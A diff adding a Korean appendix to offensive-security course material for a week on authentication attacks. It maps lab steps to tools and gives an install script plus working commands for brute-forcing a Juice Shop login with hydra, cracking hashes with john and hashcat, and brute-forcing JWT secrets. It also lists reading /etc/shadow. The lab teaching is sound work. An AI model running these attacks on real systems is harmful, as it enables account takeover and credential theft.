@@ -691,3 +691,82 @@ URL path 가 server-side decoding 후 *그대로 log* — *reflected XSS payload
 3. 본 dataset 의 email_protection_event 처럼 *자체 phishing 시뮬레이션* 도구 (gophish) 으로 XSS payload 를 email link 에 삽입 후 SEG 통과 여부 측정
 
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course1 Attack — Week 05 인증 공격)
+
+| 공격 유형 | lab step | 본문 명령 | OSS 도구 옵션 | 비고 |
+|----------|----------|----------|---------------|------|
+| 사용자 열거 (User enum) | s1 | `curl /api/Users` | ldapdomaindump / kerbrute / impacket-GetADUsers | API/AD 환경별 |
+| 수동 brute (HTTP) | s2 | `curl 반복` | hydra / medusa / patator / ffuf | hydra 가 표준 |
+| SSH brute | s3 | `hydra ssh://...` | hydra / medusa / patator / ncrack | 모두 SSH 지원 |
+| MD5 크래킹 | s4 | `john --format=raw-md5` | john / hashcat / hashid | hashcat GPU 가속 |
+| Security Question brute | s5 | `curl reset-password 반복` | hydra http-post-form / ffuf | |
+| JWT alg=none 공격 | s6 | `python3 base64` | jwt_tool / pyjwt manual / jwt-cracker | jwt_tool -X a |
+| SHA-256 크래킹 | s7 | `hashcat -m 1400` | hashcat / john --format=Raw-SHA256 | hashcat 권장 |
+| JWT secret brute | s8 | `python3 hmac brute` | jwt_tool -C -d wordlist / jwt-cracker / hashcat -m 16500 | jwt_tool 가 직관적 |
+| SSH key 생성 | s9 | `ssh-keygen -t ed25519` | ssh-keygen (기본) / ssh-copy-id | 기본 도구 |
+| Credential Stuffing | s10 | `curl 반복 + 자체 wordlist` | hydra http-post-form / ffuf / patator | 이메일+비번 조합 |
+| /etc/shadow 분석 | s11 | `cat /etc/shadow` | hashid / john unshadow + john / hashcat | unshadow 결합 |
+| NTLM 해시 생성 | s12 | `python3 hashlib` | hashcat -m 1000 / john --format=NT / impacket | NTLM-only |
+| Forgot Password (보안 질문) | s13 | `curl /security-question` | Burp Intruder / hydra / ffuf | |
+| Rate Limit 부재 점검 | s14 | `for/curl 10회` | wfuzz / ffuf -t 100 / Burp Intruder | -t 동시성 |
+| 보고 | s15 | text | hashcat --show / john --show | 크랙된 해시 출력 |
+
+### 학생 환경 준비 (한 번만 실행)
+
+```bash
+ssh ccc@192.168.0.112
+
+sudo apt update && sudo apt install -y \
+  hydra medusa ncrack patator \
+  john hashcat hashid \
+  ffuf wfuzz \
+  python3-impacket           # impacket suite (NTLM, Kerberos)
+
+# jwt_tool (4주차에 이미 설치 — 5주차 본격 사용)
+[ -d ~/jwt_tool ] || git clone https://github.com/ticarpi/jwt_tool.git ~/jwt_tool
+
+# 일반 wordlist (rockyou)
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
+ls -la /usr/share/wordlists/
+
+# kerbrute (AD 사용자 enum, Go)
+go install github.com/ropnop/kerbrute@latest 2>/dev/null
+```
+
+### 도구별 특화 매트릭스
+
+| 도구 | 강점 | 사용 예 |
+|------|------|---------|
+| **hydra** | 50+ 프로토콜 지원, 빠름, 멀티스레드 | SSH, FTP, HTTP-FORM, RDP brute |
+| **medusa** | hydra 대안, 모듈러 | 동일 |
+| **patator** | Python, 유연한 모듈 | 커스텀 형식 brute |
+| **john** | 다양한 해시, CPU 표준, 단일 모드/wordlist | 일반 해시 크래킹 |
+| **hashcat** | GPU 가속, 가장 빠름 | 대규모 해시 크래킹 |
+| **jwt_tool** | JWT 전용 (alg=none, secret brute, key confusion) | JWT 점검 |
+| **hashid / hash-identifier** | 해시 종류 식별 | 알고리즘 모를 때 |
+
+### 핵심 도구 명령 요약
+
+```bash
+# hydra — HTTP POST JSON 브루트
+hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt 10.20.30.80 -s 3000 \
+  http-post-form '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:invalid' \
+  -t 4 -V
+
+# john — MD5/SHA 크래킹
+echo 'admin:5f4dcc3b5aa765d61d8327deb882cf99' > /tmp/h.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/h.txt
+
+# hashcat — GPU 모드
+hashcat -m 0 -a 0 /tmp/h.txt /usr/share/wordlists/rockyou.txt
+hashcat --show /tmp/h.txt
+
+# jwt_tool — JWT 자동 진단 + secret brute
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -T               # 자동 약점 진단
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt
+```
+
+학생은 본 5주차에서 **인증 공격의 5 카테고리** (brute / dictionary / hash crack / JWT abuse / credential stuffing) 모두를 전용 도구로 직접 수행한다.
